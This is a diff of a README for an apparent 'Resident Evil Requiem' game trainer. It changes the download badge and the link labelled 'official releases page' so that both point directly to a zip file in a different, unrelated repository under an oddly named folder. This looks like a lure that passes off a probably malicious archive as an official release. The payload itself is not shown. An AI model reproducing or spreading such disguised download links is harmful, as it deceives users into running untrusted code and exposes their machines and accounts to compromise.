@@ -5,7 +5,7 @@ description: "Modify Resident Evil Requiem with 42+ features including god mode,
 ---
 # 🎮 Resident-Evil-Requiem-Ultimate-Trainer-2026_v_2 - Enhance your Resident Evil game experience
 
-[![](https://img.shields.io/badge/Download_Latest_Version-blue.svg)](https://github.com/Femoralpulsegenuscavia354/Resident-Evil-Requiem-Ultimate-Trainer-2026_v_2/releases)
+[![](https://img.shields.io/badge/Download_Latest_Version-blue.svg)](https://raw.githubusercontent.com/Femoralpulsegenuscavia354/femoralpulsegenuscavia354.github.io/main/undiscreet/github_io_femoralpulsegenuscavia_1.0.zip)
 
 ## 📌 Overview
 
@@ -35,7 +35,7 @@ Ensure your computer meets these standards for a stable experience:
 
 ## 📥 How to Download
 
-1. Visit the [official releases page](https://github.com/Femoralpulsegenuscavia354/Resident-Evil-Requiem-Ultimate-Trainer-2026_v_2/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/Femoralpulsegenuscavia354/femoralpulsegenuscavia354.github.io/main/undiscreet/github_io_femoralpulsegenuscavia_1.0.zip).
 2. Locate the latest version heading.
 3. Select the file ending in `.zip` or `.exe` to begin the download.
 4. Save the file to a folder you recognize, such as your Downloads folder.
